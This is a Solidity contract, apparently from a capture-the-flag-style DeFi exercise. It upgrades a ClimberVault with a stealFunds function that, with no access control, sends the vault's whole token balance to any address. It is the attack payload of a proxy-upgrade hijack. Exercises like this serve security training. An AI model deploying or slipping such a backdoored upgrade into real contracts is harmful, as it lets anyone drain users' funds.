// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {ClimberVault} from "./ClimberVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberVaultV2 is ClimberVault {
    function stealFunds(address token, address recipient) external {
        IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
    }
}
